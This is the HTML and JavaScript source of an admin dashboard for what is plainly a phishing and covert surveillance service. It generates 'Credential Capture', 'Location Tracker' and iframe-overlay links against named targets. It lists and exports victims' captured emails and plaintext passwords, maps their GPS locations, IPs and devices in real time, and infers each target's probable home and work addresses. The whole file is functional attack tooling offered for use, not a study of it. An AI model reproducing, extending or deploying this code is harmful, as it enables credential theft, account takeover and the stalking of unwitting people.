<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>:: HACKER-UI DASHBOARD v9.3 (QR Removed) ::</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.sheetjs.com/xlsx-latest/package/dist/xlsx.full.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <script>
        const token = localStorage.getItem('authToken');
        if (!token) {
            window.location.href = '/login.html';
        }
    </script>

    <audio id="notification-sound" src="/sounds/notif.mp3" preload="auto"></audio>
    
    <div class="dashboard-container">
        
        <div class="panel-left">
            <div class="dashboard-panel">
                <div class="header-actions">
                    <h1 class="main-title">> ADMIN_DASHBOARD</h1>
                    <button id="logout-btn" class="hacker-button small red"><i class="fa-solid fa-power-off"></i> LOGOUT</button>
                </div>
            </div>

            <div class="dashboard-panel">
                <div class="feature-panel">
                    <h2>> LINK_CREATION.GEN</h2>
                    <form id="link-form">
                        <div class="input-group">
                            <label for="link-type">> Choose Link Type:</label>
                            <select id="link-type" class="hacker-input">
                                <option value="direct">Location Tracker Link</option>
                                <option value="intermediate">Credential Capture Link</option>
                                <option value="iframe">IFrame Overlay Link</option>
                            </select>
                        </div>
                        <div class="input-group"><label for="original-url">> Enter Destination URL:</label><input type="url" id="original-url" class="hacker-input" placeholder="https://google.com" required></div>
                        <div class="input-group"><label for="username">> Enter Target ID:</label><input type="text" id="username" class="hacker-input" required></div>
                        
                        <a href="#" id="advanced-toggle" class="advanced-toggle-link">[ + Advanced Options ]</a>
                        <div id="advanced-options" class="advanced-options-collapsed">
                            <p class="advanced-title">> Device-Specific Redirects (Optional)</p>
                            <div class="input-group"><label for="url-android">> Android URL:</label><input type="url" id="url-android" class="hacker-input" placeholder="https://play.google.com/store/apps/..."></div>
                            <div class="input-group"><label for="url-ios">> iOS URL:</label><input type="url" id="url-ios" class="hacker-input" placeholder="https://apps.apple.com/app/..."></div>
                        </div>
                        
                        <div class="input-group" style="margin-top: 15px;"><label for="expires-in">> Set Expiration:</label><select id="expires-in" class="hacker-input"><option value="">Never</option><option value="1">1 Hour</option><option value="24">24 Hours</option><option value="168">7 Days</option></select></div>
                        <button type="submit" id="submit-btn" class="hacker-button">[ GENERATE ]</button>
                    </form>
                </div>
                <div id="result-box" class="result-box-hidden"></div>
            </div>

            <div class="dashboard-panel">
                <h1 class="main-title">> SYSTEM_STATS.LOG</h1>
                <div class="stats-grid">
                    <div class="stat-card"><div class="stat-value" id="total-links">0</div><div class="stat-label">Total Links</div></div>
                    <div class="stat-card"><div class="stat-value" id="total-clicks">0</div><div class="stat-label">Total Clicks</div></div>
                    <div class="stat-card"><div class="stat-value" id="total-locations">0</div><div class="stat-label">Locations Logged</div></div>
                </div>
            </div>

            <div class="dashboard-panel">
                <h1 class="main-title">> TOP_5_LINKS.CHART</h1>
                <canvas id="topLinksChart"></canvas>
            </div>
            <div class="dashboard-panel">
                <h1 class="main-title">> BROWSER_STATS.CHART</h1>
                <canvas id="browserChart"></canvas>
            </div>
            <div class="dashboard-panel">
                <h1 class="main-title">> LIVE_LOGS.TXT</h1>
                <div id="log-section"></div>
            </div>
        </div>
        
        <div class="panel-right">
             <div class="dashboard-panel">
                <div class="table-header-actions">
                    <h1 class="main-title" style="margin: 0; border: none;">> DATA_CENTER</h1>
                    <a href="/database_view.html" class="hacker-button small cyan"><i class="fa-solid fa-database"></i> VIEW ALL RAW DATA</a>
                </div>
            </div>

            <div class="dashboard-panel">
                <h1 class="main-title">> LOCATION_TRACKER_LINKS.DAT</h1>
                <div class="table-container" id="location-links-section"><p class="highlight">> Awaiting data...</p></div>
            </div>
            
            <div class="dashboard-panel">
                <div class="table-header-actions">
                    <h1 class="main-title">> CREDENTIALS_LINKS_AND_LOGS.DAT</h1>
                    <button id="export-excel-btn" class="hacker-button small"><i class="fa-solid fa-file-excel"></i> EXPORT TO EXCEL</button>
                </div>
                <div class="table-container" id="merged-credentials-section"><p class="highlight">> Awaiting data...</p></div>
            </div>

            <div id="intel-analysis-section" class="dashboard-panel intel-panel-hidden">
                <h1 class="main-title intel-title">> INTEL_ANALYSIS_ENGINE.DAT</h1>
                <h2>> BEHAVIORAL ANALYSIS for: <span id="intel-target-name" class="highlight"></span></h2>
                <div id="intel-results"><p class="highlight">> Awaiting analysis command...</p></div>
            </div>
            
            <div class="dashboard-panel">
                <h1 class="main-title">> REALTIME_LOCATION_MAP</h1>
                <div id="realtime-map" class="map-container"></div>
            </div>
        </div>
    </div>
    
    <div id="map-modal" class="modal">
        <div class="modal-content">
            <span class="close-btn">√ó</span>
            <h2 id="modal-title" class="main-title" style="font-size: 24px;">Location History</h2>
            <div id="map" class="map-container"></div>
            <div id="map-actions" style="text-align: center; margin-top: 15px;"></div>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const authToken = localStorage.getItem('authToken');
        const authHeaders = { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` };

        async function fetchProtected(url, options = {}) {
            const response = await fetch(url, { ...options, headers: { ...options.headers, ...authHeaders } });
            if (response.status === 401) { localStorage.removeItem('authToken'); window.location.href = '/login.html'; }
            return response;
        }

        const locationLinksSection = document.getElementById('location-links-section');
        const mergedCredentialsSection = document.getElementById('merged-credentials-section');
        const resultBox = document.getElementById('result-box');
        const totalLinksEl = document.getElementById('total-links'), totalClicksEl = document.getElementById('total-clicks'), totalLocationsEl = document.getElementById('total-locations');
        const logSection = document.getElementById('log-section'), logoutBtn = document.getElementById('logout-btn'), linkForm = document.getElementById('link-form');
        const advancedToggle = document.getElementById('advanced-toggle'), advancedOptions = document.getElementById('advanced-options');
        const notificationSound = document.getElementById('notification-sound');
        const modal = document.getElementById('map-modal'), modalTitle = document.getElementById('modal-title'), closeBtn = modal.querySelector('.close-btn'), mapActionsDiv = document.getElementById('map-actions');
        // [DIHAPUS] Variabel untuk QR Code tidak diperlukan lagi
        const exportExcelBtn = document.getElementById('export-excel-btn');
        let topLinksChart, browserChart, map, markersLayer, realtimeMap, realtimeMarkersLayer, isAudioEnabled = false;
        
        let currentCredentialCount = 0;
        let isInitialLoad = true;
        let lastCredentialsData = [];

        function showNotification(message, icon = 'üíÄ') {
            if (notificationSound.dataset.enabled === "true") {
                notificationSound.currentTime = 0;
                notificationSound.play().catch(e => console.error("Error playing sound:", e));
            } else {
                console.warn("Audio not enabled by user yet. Click anywhere to enable.");
            }
            const notificationElement = document.createElement("div");
            notificationElement.className = "click-notification";
            notificationElement.innerHTML = `<span>${icon}</span> ${message}`; 
            document.body.appendChild(notificationElement);
            setTimeout(() => {
                notificationElement.style.opacity = "0";
                setTimeout(() => notificationElement.remove(), 500);
            }, 5000);
        }
        
        function enableAudio() {
            if (notificationSound.dataset.enabled === "true") return;
            notificationSound.play().then(() => {
                notificationSound.pause();
                notificationSound.currentTime = 0;
                notificationSound.dataset.enabled = "true";
                console.log("‚úÖ Audio unlocked successfully.");
                document.body.removeEventListener("click", enableAudio);
                document.body.removeEventListener("keydown", enableAudio);
            }).catch(e => {
                console.error("‚ùå Audio unlock failed. Requires user interaction.", e);
            });
        }
        document.body.addEventListener('click', enableAudio, { once: true });
        document.body.addEventListener('keydown', enableAudio, { once: true });

        function initModalMap() { if (!map) { const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '¬© OSM' }); const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '¬© Esri' }); map = L.map('map', { center: [0, 0], zoom: 2, layers: [street] }); L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(map); markersLayer = L.featureGroup().addTo(map); } }
        function initRealtimeMap() { if (!realtimeMap) { const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '¬© OSM' }); const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '¬© Esri' }); realtimeMap = L.map('realtime-map', { center: [0, 0], zoom: 2, layers: [street] }); L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(realtimeMap); realtimeMarkersLayer = L.featureGroup().addTo(realtimeMap); } }
        initRealtimeMap();

        // [DIHAPUS] Fungsi showQrModal() sudah tidak ada
        
        closeBtn.onclick = () => { modal.style.display = "none" };
        window.addEventListener('click', (event) => { if (event.target == modal) { modal.style.display = "none"; } });
        
        advancedToggle.addEventListener('click', (e) => {
            e.preventDefault();
            const isCollapsed = advancedOptions.classList.contains('advanced-options-collapsed');
            if (isCollapsed) {
                advancedOptions.classList.remove('advanced-options-collapsed');
                e.target.textContent = '[ - Advanced Options ]';
            } else {
                advancedOptions.classList.add('advanced-options-collapsed');
                e.target.textContent = '[ + Advanced Options ]';
            }
        });

        function exportToExcel() {
            if (lastCredentialsData.length === 0) {
                alert("No credential data to export.");
                return;
            }
            const dataToExport = lastCredentialsData.map(cred => ({
                'Timestamp': new Date(cred.event_time).toLocaleString('id-ID'),
                'Link ID': cred.id,
                'Target ID': cred.username,
                'Email': cred.email,
                'Password': cred.password,
                'IP Address': cred.ip_address,
                'Status': (cred.expires_at && new Date(cred.expires_at) < new Date()) ? 'EXPIRED' : 'ACTIVE'
            }));
            const worksheet = XLSX.utils.json_to_sheet(dataToExport);
            const workbook = XLSX.utils.book_new();
            XLSX.utils.book_append_sheet(workbook, worksheet, "Credentials");
            worksheet["!cols"] = [ { wch: 20 }, { wch: 25 }, { wch: 15 }, { wch: 25 }, { wch: 25 }, { wch: 18 }, { wch: 10 } ];
            const timestamp = new Date().toISOString().slice(0, 19).replace(/:/g, "-");
            XLSX.writeFile(workbook, `credentials_log_${timestamp}.xlsx`);
        }
        exportExcelBtn.addEventListener('click', exportToExcel);

        function copyToClipboard(text, element) {
            navigator.clipboard.writeText(text).then(() => {
                const originalIcon = element.innerHTML;
                element.innerHTML = `<i class="fa-solid fa-check"></i>`;
                element.classList.add('copied');
                setTimeout(() => {
                    element.innerHTML = originalIcon;
                    element.classList.remove('copied');
                }, 1500);
            }).catch(err => {
                console.error('Failed to copy: ', err);
            });
        }
        
        function renderLocationLinksTable(links = []) {
            const locationLinks = links.filter(link => link.link_type === 'direct' || link.link_type === 'iframe');
            if (locationLinks.length === 0) {
                locationLinksSection.innerHTML = "<p class='error'>\> NO LOCATION TRACKER LINKS FOUND.</p>";
            } else {
                let html = `<table class="hacker-table"><thead><tr><th>Created</th><th>Link</th><th>Target</th><th>Clicks</th><th>Last Location</th><th>Status</th><th>Actions</th></tr></thead><tbody>`;
                locationLinks.forEach(r => {
                    const linkUrl = `${window.location.protocol}//${window.location.host}/${r.id}`;
                    const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
                    const statusClass = isExpired ? 'error' : 'active';
                    const statusText = isExpired ? 'EXPIRED' : 'ACTIVE';
                    let mapButton = `<button class="hacker-button small" disabled title="No location data yet"><i class="fa-solid fa-map-location-dot"></i></button>`;
                    if (r.click_count > 0 && r.city) { 
                        mapButton = `<button class="hacker-button small" onclick="showMapModal('${r.id}', '${r.username}')" title="View Map"><i class="fa-solid fa-map-location-dot"></i></button>`; 
                    }
                    // [DIHAPUS] const qrButton sudah tidak ada
                    const analyzeButton = `<button class="hacker-button small cyan" onclick="runIntelAnalysis('${r.username}')" title="Analyze Target"><i class="fa-solid fa-brain"></i></button>`;
                    const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')" title="Delete Link"><i class="fa-solid fa-trash-can"></i></button>`;
                    const locationText = r.city && r.country ? `${r.city}, ${r.country}` : 'N/A';
                    
                    html += `<tr>
                        <td>${new Date(r.created_at).toLocaleDateString('id-ID')}</td>
                        <td class="link-cell">
                            <a href="${linkUrl}" target="_blank" title="${linkUrl}">${r.id}</a>
                            <button class="copy-btn" onclick="copyToClipboard('${linkUrl}', this)" title="Copy Link"><i class="fa-regular fa-copy"></i></button>
                        </td>
                        <td class="highlight">${r.username}</td>
                        <td class="highlight-green">${r.click_count}</td>
                        <td class="highlight">${locationText}</td>
                        <td><span class="status-pill ${statusClass}">${statusText}</span></td>
                        <td class="action-button-group">${mapButton} ${analyzeButton} ${deleteButton}</td>
                    </tr>`;
                });
                html += "</tbody></table>";
                locationLinksSection.innerHTML = html;
            }
        }
        
        function renderMergedCredentialsTable(links = [], credentials = []) {
            const credentialLinks = links.filter(link => link.link_type === 'intermediate');
            if (credentialLinks.length === 0) {
                mergedCredentialsSection.innerHTML = "<p class='error'>\> NO CREDENTIAL CAPTURE LINKS CREATED.</p>";
                lastCredentialsData = [];
                return;
            }

            let mergedData = [];
            const credentialsMap = new Map();
            for (const cred of credentials) {
                if (!credentialsMap.has(cred.tracker_id)) {
                    credentialsMap.set(cred.tracker_id, []);
                }
                credentialsMap.get(cred.tracker_id).push(cred);
            }
            
            let validCredentialsForExport = [];
            for (const link of credentialLinks) {
                const capturedCreds = credentialsMap.get(link.id);
                if (capturedCreds && capturedCreds.length > 0) {
                    for (const cred of capturedCreds) {
                        const mergedEntry = { ...link, email: cred.email, password: cred.password, ip_address: cred.ip_address, event_time: cred.created_at };
                        mergedData.push(mergedEntry);
                        validCredentialsForExport.push(mergedEntry);
                    }
                } else {
                    mergedData.push({ ...link, email: '...', password: '...', ip_address: '...', event_time: link.created_at });
                }
            }
            
            lastCredentialsData = validCredentialsForExport;
            mergedData.sort((a, b) => new Date(b.event_time) - new Date(a.event_time));

            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Link</th><th>Target</th><th>Clicks</th><th>Email</th><th>Password</th><th>Status</th><th>Actions</th></tr></thead><tbody>`;
            mergedData.forEach(r => {
                const linkUrl = `${window.location.protocol}//${window.location.host}/${r.id}`;
                const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
                const statusClass = isExpired ? 'error' : 'active';
                const statusText = isExpired ? 'EXPIRED' : 'ACTIVE';
                // [DIHAPUS] const qrButton sudah tidak ada
                const analyzeButton = `<button class="hacker-button small cyan" onclick="runIntelAnalysis('${r.username}')" title="Analyze Target"><i class="fa-solid fa-brain"></i></button>`;
                const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')" title="Delete Link"><i class="fa-solid fa-trash-can"></i></button>`;
                
                html += `<tr>
                    <td>${new Date(r.event_time).toLocaleString('id-ID')}</td>
                    <td class="link-cell">
                        <a href="${linkUrl}" target="_blank" title="${linkUrl}">${r.id}</a>
                        <button class="copy-btn" onclick="copyToClipboard('${linkUrl}', this)" title="Copy Link"><i class="fa-regular fa-copy"></i></button>
                    </td>
                    <td class="highlight">${r.username}</td>
                    <td class="highlight-green">${r.click_count}</td>
                    <td class="highlight-red">${r.email}</td>
                    <td class="highlight-red">${r.password}</td>
                    <td><span class="status-pill ${statusClass}">${statusText}</span></td>
                    <td class="action-button-group">${analyzeButton} ${deleteButton}</td>
                </tr>`;
            });
            html += "</tbody></table>";
            mergedCredentialsSection.innerHTML = html;
        }
        
        function updateStats(e) { totalLinksEl.textContent = e.total_links || 0, totalClicksEl.textContent = e.total_clicks || 0, totalLocationsEl.textContent = e.total_locations || 0 }
        function updateTopLinksChart(e = []) { const o = document.getElementById('topLinksChart').getContext('2d'), t = [...e].sort((e, o) => o.click_count - e.click_count).slice(0, 5), a = t.map(e => e.id), n = t.map(e => e.click_count); topLinksChart ? (topLinksChart.data.labels = a, topLinksChart.data.datasets[0].data = n, topLinksChart.update()) : topLinksChart = new Chart(o, { type: 'bar', data: { labels: a, datasets: [{ label: 'Total Clicks', data: n, backgroundColor: 'rgba(0,255,65,0.5)', borderColor: '#00ff41', borderWidth: 1 }] }, options: { indexAxis: 'y', scales: { x: { ticks: { color: 'var(--text-primary)' }, grid: { color: 'rgba(0,255,65,0.1)' } }, y: { ticks: { color: 'var(--text-primary)', font: { size: 10 } }, grid: { color: 'rgba(0,255,65,0.1)' } } }, plugins: { legend: { display: !1 } } } }) }
        function updateBrowserChart(e = {}) { const o = document.getElementById('browserChart').getContext('2d'), t = Object.keys(e), a = Object.values(e); browserChart ? (browserChart.data.labels = t, browserChart.data.datasets[0].data = a, browserChart.update()) : browserChart = new Chart(o, { type: 'pie', data: { labels: t, datasets: [{ data: a, backgroundColor: ['#00ff41', '#ff00ff', '#00ffff', '#ffaa00', '#888888'], borderColor: 'var(--bg-dark)', borderWidth: 2 }] }, options: { plugins: { legend: { position: 'bottom', labels: { color: 'var(--text-primary)', boxWidth: 15, padding: 15 } } } } }) }
        async function deleteLink(e, o) { if (confirm(`Are you sure you want to delete the link for target '${o}' (${e})?\n\nAll associated location and credential data will also be permanently deleted!`)) try { const response = await fetchProtected(`/api/links/${e}`, { method: 'DELETE' }); if (!response.ok) throw new Error('Failed to delete link.') } catch (e) { alert(`Error: ${e.message}`) } }
        async function showMapModal(id, name) {
            initModalMap();
            modal.style.display = "block";
            modalTitle.textContent = `> Location History for: ${name}`;
            setTimeout(() => map.invalidateSize(), 1);
            markersLayer.clearLayers();
            mapActionsDiv.innerHTML = `<p class="highlight">Loading data...</p>`;
            try {
                const response = await fetchProtected(`/api/locations/${id}`);
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                const locations = await response.json();
                if (locations && locations.length > 0) {
                    const validLocations = locations.filter(loc => loc.latitude != null && loc.longitude != null);
                    if (validLocations.length > 0) {
                        validLocations.forEach(loc => {
                            const marker = L.marker([loc.latitude, loc.longitude]);
                            const locationString = (loc.city && loc.country) ? `${loc.city}, ${loc.country}` : 'Location unknown';
                            marker.bindPopup(`<b>${new Date(loc.created_at).toLocaleString('id-ID')}</b><br><strong>${locationString}</strong><br><br><strong>IP:</strong> ${loc.ip_address}<br><strong>ISP:</strong> ${loc.isp || 'N/A'}<br><strong>Organization:</strong> ${loc.org || 'N/A'}<br><strong>Proxy/VPN:</strong> ${loc.proxy ? '<span class="error">Yes</span>' : 'No'}<br><br><strong>Device:</strong> ${loc.browser} on ${loc.os}<br>(${loc.device.type} - ${loc.device.vendor} ${loc.device.model})`);
                            markersLayer.addLayer(marker);
                        });
                        const latestLocation = validLocations[0];
                        const googleMapsUrl = `http://maps.google.com/maps?q=${latestLocation.latitude},${latestLocation.longitude}`;
                        mapActionsDiv.innerHTML = `<a href="${googleMapsUrl}" target="_blank" class="hacker-button"><i class="fa-solid fa-location-arrow"></i> VIEW ON GOOGLE MAPS</a>`;
                        map.fitBounds(markersLayer.getBounds());
                    } else { mapActionsDiv.innerHTML = `<p class="error">No valid location data found.</p>`; map.setView([0, 0], 2); }
                } else { mapActionsDiv.innerHTML = `<p class="error">No location data found.</p>`; map.setView([0, 0], 2); }
            } catch (err) { mapActionsDiv.innerHTML = `<p class="error">Failed to load location data. Error: ${err.message}</p>`; map.setView([0, 0], 2); }
        }
        async function runIntelAnalysis(username) {
            const intelSection = document.getElementById('intel-analysis-section');
            const intelResultsDiv = document.getElementById('intel-results');
            const intelTargetName = document.getElementById('intel-target-name');
            intelSection.classList.remove('intel-panel-hidden');
            intelTargetName.textContent = username;
            intelResultsDiv.innerHTML = `<p class="highlight">> PROCESSING INTEL DATA... STAND BY...</p>`;
            try {
                const response = await fetchProtected(`/api/intel/${username}`);
                const data = await response.json();
                if (!response.ok) { throw new Error(data.error || 'Analysis failed'); }
                renderIntelResults(data);
            } catch (err) { intelResultsDiv.innerHTML = `<p class="error">> ERROR: ${err.message}</p>`; }
        }
        function renderIntelResults(data) {
            const intelResultsDiv = document.getElementById('intel-results');
            if (data.message) { intelResultsDiv.innerHTML = `<p class="error">> ANALYSIS FAILED: ${data.message}</p>`; return; }
            let html = '';
            if (data.home) { const mapUrl = `http://maps.google.com/maps?q=${data.home.lat},${data.home.lon}`; html += `<p>> [üè†] Probable Home Location: <a href="${mapUrl}" target="_blank">[View on Map]</a> (Based on ${data.home.count} visits)</p>`;
            } else { html += `<p>> [üè†] Probable Home Location: <span class="error">Not enough data.</span></p>`; }
            if (data.work) { const mapUrl = `http://maps.google.com/maps?q=${data.work.lat},${data.work.lon}`; html += `<p>> [üè¢] Probable Work Location: <a href="${mapUrl}" target="_blank">[View on Map]</a> (Based on ${data.work.count} visits)</p>`;
            } else { html += `<p>> [üè¢] Probable Work Location: <span class="error">Not enough data.</span></p>`; }
            html += `<hr class="intel-hr">`;
            if (data.anomalies && data.anomalies.length > 0) {
                html += `<p>> [üö®] Anomalies Detected:</p>`;
                data.anomalies.forEach(anomaly => { html += `<p class="error" style="margin-left: 15px;">- ${anomaly}</p>`; });
            } else { html += `<p>> [üö®] Anomalies Detected: <span class="highlight">None.</span></p>`; }
            intelResultsDiv.innerHTML = html;
        }
        function throttle(func, limit) { let inThrottle, lastResult; return function() { const args = arguments, context = this; if (!inThrottle) { inThrottle = true; setTimeout(() => inThrottle = false, limit); lastResult = func.apply(context, args); } return lastResult; }; }
        const handleDashboardUpdate = (e) => {
            if (!isInitialLoad && e.credentials.length > currentCredentialCount) { const newCredential = e.credentials[0]; showNotification(`üîí Credentials captured from [<strong>${newCredential.username}</strong>]!`, 'üîí'); }
            currentCredentialCount = e.credentials.length;
            isInitialLoad = false;
            renderLocationLinksTable(e.links);
            renderMergedCredentialsTable(e.links, e.credentials);
            updateStats(e.stats);
            updateTopLinksChart(e.links);
            updateBrowserChart(e.browserStats);
        };
        const throttledUpdate = throttle(handleDashboardUpdate, 1000);
        const socket = io();
        socket.on('connect', () => { console.log('‚úÖ Connected to server via WebSocket!'); socket.emit('request_initial_data', { token: authToken }); });
        socket.on('dashboard_update', throttledUpdate);
        socket.on('new_log_message', e => { const o = document.createElement('p'); o.textContent = e; logSection.appendChild(o); logSection.scrollTop = logSection.scrollHeight });
        socket.on('link_clicked', e => { showNotification(`Link accessed by [<strong>${e.username}</strong>]!`); });
        socket.on('new_location_logged', (newLocation) => {
            showNotification(`üìç Location captured from [<strong>${newLocation.username}</strong>]!`, 'üìç');
            const marker = L.marker([newLocation.latitude, newLocation.longitude]);
            const locationString = (newLocation.city && newLocation.country) ? `${newLocation.city}, ${newLocation.country}` : 'Location unknown';
            marker.bindPopup(`<b>${newLocation.username}</b><br>${new Date(newLocation.created_at).toLocaleString('id-ID')}<br><strong>${locationString}</strong>`);
            if(realtimeMarkersLayer) { realtimeMarkersLayer.addLayer(marker); realtimeMap.panTo([newLocation.latitude, newLocation.longitude]); }
        });
        linkForm.addEventListener('submit', async e => {
            e.preventDefault();
            const submitBtn = document.getElementById('submit-btn');
            submitBtn.innerHTML = "[ ...PROCESSING... ]"; submitBtn.disabled = true;
            try {
                const body = { username: document.getElementById('username').value, originalUrl: document.getElementById('original-url').value, url_android: document.getElementById('url-android').value, url_ios: document.getElementById('url-ios').value, expiresIn: document.getElementById('expires-in').value, linkType: document.getElementById('link-type').value };
                const response = await fetchProtected('/create', { method: 'POST', body: JSON.stringify(body) });
                const o = await response.json();
                if (o.newLink) {
                    resultBox.className = 'result-box-visible';
                    resultBox.innerHTML = `<p>> LINK GENERATED FOR <span class="highlight">${o.username}</span>: <a href="${o.newLink}" target="_blank">${o.newLink}</a></p>`;
                    linkForm.reset(); 
                    advancedOptions.classList.add('advanced-options-collapsed'); 
                    advancedToggle.textContent = '[ + Advanced Options ]';
                } else { throw new Error(o.error || o.message); }
            } catch (e) {
                resultBox.className = 'result-box-visible';
                resultBox.innerHTML = `<p class="error">> ERROR: ${e.message}</p>`;
            } finally {
                submitBtn.innerHTML = "[ GENERATE ]"; 
                submitBtn.disabled = false;
            }
        });
        logoutBtn.addEventListener('click', () => { localStorage.removeItem('authToken'); window.location.href = '/login.html'; });

    </script>
</body>
</html>